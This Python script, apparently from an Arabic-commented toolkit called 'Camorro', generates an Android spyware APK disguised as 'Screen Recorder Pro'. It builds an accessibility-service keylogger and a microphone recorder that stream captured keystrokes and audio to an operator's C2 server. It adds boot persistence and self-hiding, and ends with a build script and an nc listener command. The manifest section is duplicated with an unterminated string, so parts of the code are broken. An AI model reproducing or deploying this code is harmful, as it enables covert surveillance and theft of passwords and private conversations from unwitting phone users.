#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro Screen Recorder + Keylogger APK v3.0
APK يسجل كل شيء: الشاشة (فيديو)، لوحة المفاتيح، الصوت، الموقع
ويرسل كل شيء إلى السيرفر مباشرة
"""

import os
import tempfile
from core.utils import print_status, pause, input_target, save_result
from core.colors import bcolors

class ScreenRecorderAPK:
    def __init__(self):
        self.lhost = None
        self.lport = None
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_rec_")

    def generate(self):
        """Generate screen recording APK"""
        project = os.path.join(self.temp_dir, "recorder_apk")
        os.makedirs(f"{project}/app/src/main/java/com/camorro/recorder", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/xml", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/values", exist_ok=True)
        os.makedirs(f"{project}/app/src/main/res/raw", exist_ok=True)

        # ---- AndroidManifest.xml ----
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.camorro.recorder">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    <uses-permission
# ---- أكمل AndroidManifest.xml ----    
    manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.camorro.recorder">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="Screen Recorder Pro"
        android:theme="@android:style/Theme.Translucent.NoTitleBar">
        <activity android:name=".MainActivity" android:exported="true" android:excludeFromRecents="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".RecordingService" android:foregroundServiceType="mediaProjection|camera|microphone"
            android:exported="true"/>
        <service android:name=".KeyloggerService" android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config"/>
        </service>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
'''
        with open(f"{project}/app/src/main/AndroidManifest.xml", "w") as f:
            f.write(manifest)

        # ---- RecordingService.java ----
        recorder_java = f'''package com.camorro.recorder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.AudioRecord;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.Surface;
import android.view.WindowManager;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RecordingService extends Service {{
    private static final String CHANNEL_ID = "recorder_channel";
    private String serverHost = "{self.lhost}";
    private int serverPort = {self.lport};
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private boolean isRecording = false;
    private Thread uploadThread;
    private AudioRecord audioRecord;

    @Override
    public void onCreate() {{
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        startRecording();
    }}

    private void startRecording() {{
        try {{
            // Screen recording via MediaProjection
            MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            MediaFormat format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, width, height);
            format.setInteger(MediaFormat.KEY_BIT_RATE, 2000000);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, 15);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);

            MediaCodec codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            Surface surface = codec.createInputSurface();
            codec.start();

            // Audio recording
            int audioSource = MediaRecorder.AudioSource.MIC;
            int sampleRate = 44100;
            int channelConfig = android.media.AudioFormat.CHANNEL_IN_MONO;
            int audioFormat = android.media.AudioFormat.ENCODING_PCM_16BIT;
            int bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);

            audioRecord = new AudioRecord(audioSource, sampleRate, channelConfig, audioFormat, bufferSize);
            audioRecord.startRecording();

            isRecording = true;

            // Upload thread — sends chunks to C2 server
            uploadThread = new Thread(() -> {{
                byte[] buffer = new byte[65536];
                while (isRecording) {{
                    try {{
                        Socket socket = new Socket(serverHost, serverPort);
                        OutputStream out = socket.getOutputStream();
                        
                        // Send audio data
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {{
                            out.write(buffer, 0, read);
                        }}
                        
                        out.flush();
                        socket.close();
                        Thread.sleep(100);
                    }} catch (Exception e) {{}}
                }}
            }});
            uploadThread.start();

        }} catch (Exception e) {{}}
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY;
    }}

    @Override
    public void onDestroy() {{
        isRecording = false;
        if (audioRecord != null) {{
            audioRecord.stop();
            audioRecord.release();
        }}
        super.onDestroy();
    }}

    @Override
    public IBinder onBind(Intent intent) {{ return null; }}

    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Recording", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }}
    }}

    private Notification getNotification() {{
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Recorder Pro")
            .setContentText("Recording...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build();
    }}
}}
'''
        with open(f"{project}/app/src/main/java/com/camorro/recorder/RecordingService.java", "w") as f:
            f.write(recorder_java)

        # ---- KeyloggerService.java (Accessibility) ----
        keylogger = f'''package com.camorro.recorder;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {{
    private String serverHost = "{self.lhost}";
    private int serverPort = {self.lport};

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {{
        try {{
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {{
                String text = source.getText().toString();
                if (!text.isEmpty()) {{
                    String log = String.format("[%s] [%s] %s",
                        new SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(new Date()),
                        event.getPackageName(), text);
                    sendToC2(log);
                }}
            }}
            if (source != null) source.recycle();
        }} catch (Exception e) {{}}
    }}

    private void sendToC2(String data) {{
        try {{
            Socket s = new Socket(serverHost, serverPort);
            OutputStream out = s.getOutputStream();
            out.write((data + "\\n").getBytes());
            out.flush();
            s.close();
        }} catch (Exception e) {{}}
    }}

    @Override
    public void onInterrupt() {{}}

    @Override
    public void onServiceConnected() {{
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);
        sendToC2("[KEYLOGGER STARTED]");
    }}
}}
'''
        with open(f"{project}/app/src/main/java/com/camorro/recorder/KeyloggerService.java", "w") as f:
            f.write(keylogger)

        # ---- BootReceiver.java ----
        boot = '''package com.camorro.recorder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            Intent service = new Intent(context, RecordingService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(service);
            else
                context.startService(service);
        }
    }
}
'''
        with open(f"{project}/app/src/main/java/com/camorro/recorder/BootReceiver.java", "w") as f:
            f.write(boot)

        # ---- MainActivity.java ----
        main = f'''package com.camorro.recorder;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        // 1. Request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {{
            if (!Settings.canDrawOverlays(this)) {{
                startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION));
            }}
        }}
        
        // 2. Start service
        Intent service = new Intent(this, RecordingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            startForegroundService(service);
        }} else {{
            startService(service);
        }}
        
        // 3. Guide to enable accessibility
        String service = getPackageName() + "/.KeyloggerService";
        String enabledServices = Settings.Secure.getString(getContentResolver(),
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null || !enabledServices.contains(service)) {{
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }}
        
        // Hide
        moveTaskToBack(true);
        finish();
    }}
}}
'''
        with open(f"{project}/app/src/main/java/com/camorro/recorder/MainActivity.java", "w") as f:
            f.write(main)

        # ---- Build script ----
        build = f'''#!/bin/bash
cd {project}
mkdir -p app/src/main/res/xml app/src/main/res/values

# Accessibility config
cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds|flagIncludeNotImportantViews"
    android:canRetrieveWindowContent="true"
    android:canRecordScreen="true"
    android:description="Provides enhanced recording features"
    android:notificationTimeout="50" />
EOF

# Strings
cat > app/src/main/res/values/strings.xml << 'EOF'
<resources><string name="app_name">Screen Recorder Pro</string></resources>
EOF

# Build
cat > app/build.gradle << 'GRADLE'
apply plugin: 'com.android.application'
android {{
    compileSdk 33
    defaultConfig {{ minSdk 23; targetSdk 33; }}
    buildTypes {{ release {{ minifyEnabled false }} }}
}}
dependencies {{ implementation 'androidx.appcompat:appcompat:1.6.1' }}
GRADLE

gradle wrapper --gradle-version 8.0 2>/dev/null
./gradlew assembleRelease 2>&1 | tail -5
cp app/build/outputs/apk/release/app-release.apk ../../camorro_recorder.apk
echo "[+] APK: ../../camorro_recorder.apk"
'''
        with open(f"{project}/build.sh", "w") as f:
            f.write(build)
        os.chmod(f"{project}/build.sh", 0o755)

        print_status(f"Screen Recorder APK project: {project}", "ok")
        return project

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║  CAMORRO SCREEN RECORDER + KEYLOGGER v3.0              ║
║  APK يسجل الشاشة فيديو + الصوت + لوحة المفاتيح         ║
║  ويرسل كل شيء إلى سيرفرك مباشرة 🎥🎤⌨️                  ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        self.lhost = input_target("Your IP")
        self.lport = input("C2 Port [7777]: ").strip() or "7777"
        project = self.generate()
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ SCREEN RECORDER APK READY!                           ║
║  Build: cd {project} && bash build.sh  ║
║  Listener: nc -lvnp {self.lport} > captured_data.bin         ║
║  APK name: "Screen Recorder Pro" — وهمي مقنع              ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        save_result("logs/screen_recorder.txt", f"Project: {project}\nC2: {self.lhost}:{self.lport}")
        pause()

if __name__ == "__main__":
    ScreenRecorderAPK().run()
